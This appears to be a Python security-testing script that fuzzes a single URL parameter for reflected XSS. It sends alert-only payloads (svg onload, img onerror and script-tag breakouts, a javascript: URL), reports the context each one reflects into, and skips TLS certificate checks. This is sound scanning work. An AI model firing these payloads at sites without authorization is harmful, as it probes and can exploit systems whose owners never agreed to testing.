#!/usr/bin/env python3
"""
Fuzz one URL parameter for reflected XSS indicators.

The script sends context-breaking payloads and checks whether they return
unencoded in HTML, script, attribute, or URL contexts. A positive result is
payload reflection in an executable context; browser confirmation is required
for final exploit status.
"""
import argparse
import html
import json
import re
import ssl
import sys
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"


def mutate(url, param, value):
    parts = urlsplit(url)
    qs = dict(parse_qsl(parts.query, keep_blank_values=True))
    qs[param] = value
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(qs), parts.fragment))


def fetch(url, timeout):
    req = Request(url, headers={"User-Agent": "prod-sec-xss-fuzzer/1.0"})
    try:
        with urlopen(req, timeout=timeout, context=ssl._create_unverified_context()) as resp:
            body = resp.read(300000).decode("utf-8", "replace")
            return resp.status, dict(resp.headers), body, None
    except HTTPError as exc:
        body = exc.read(300000).decode("utf-8", "replace")
        return exc.code, dict(exc.headers), body, None
    except (URLError, TimeoutError, ssl.SSLError) as exc:
        return 0, {}, "", str(exc)


def context(body, payload):
    if payload in body:
        idx = body.find(payload)
        before = body[max(0, idx - 80):idx].lower()
        after = body[idx:idx + 120].lower()
        if "<script" in before and "</script" in after:
            return "script"
        if re.search(r"<[^>]+$", before):
            return "tag_or_attribute"
        return "html"
    if html.escape(payload) in body:
        return "encoded"
    return ""


def main():
    parser = argparse.ArgumentParser(description="Probe reflected XSS in one parameter.")
    parser.add_argument("target_url")
    parser.add_argument("--param", required=True)
    parser.add_argument("--safe-mode", action="store_true", help="Use alert-only payloads and no stored workflow crawling.")
    parser.add_argument("--timeout", type=float, default=8)
    args = parser.parse_args()

    payloads = [
        "prodsec-xss-marker",
        "<svg/onload=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
        "</script><script>alert(1)</script>",
        "javascript:alert(1)",
    ]
    findings = []
    observations = []
    for payload in payloads:
        url = mutate(args.target_url, args.param, payload)
        status, headers, body, error = fetch(url, args.timeout)
        if error:
            print(f"{RED}[ERROR]{RESET} {payload}: {error}")
            continue
        ctx = context(body, payload)
        csp = next((v for k, v in headers.items() if k.lower() == "content-security-policy"), "")
        observations.append({"payload": payload, "status": status, "context": ctx, "csp": bool(csp)})
        print(f"{GREEN if ctx == 'encoded' or not ctx else YELLOW}[TEST]{RESET} payload={payload!r} status={status} context={ctx or '-'} csp={'yes' if csp else 'no'}")
        if ctx in ("script", "tag_or_attribute", "html") and payload != "prodsec-xss-marker":
            findings.append({
                "title": "Possible reflected XSS",
                "severity": "High" if ctx in ("script", "tag_or_attribute") else "Medium",
                "evidence": f"Payload reflected unencoded in {ctx} context",
                "poc": url,
                "status": "Unconfirmed until browser execution is observed",
            })

    print("JSON_SNIPPET:", json.dumps({"tool": "xss_fuzzer", "target": args.target_url, "param": args.param, "findings": findings, "observations": observations}, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
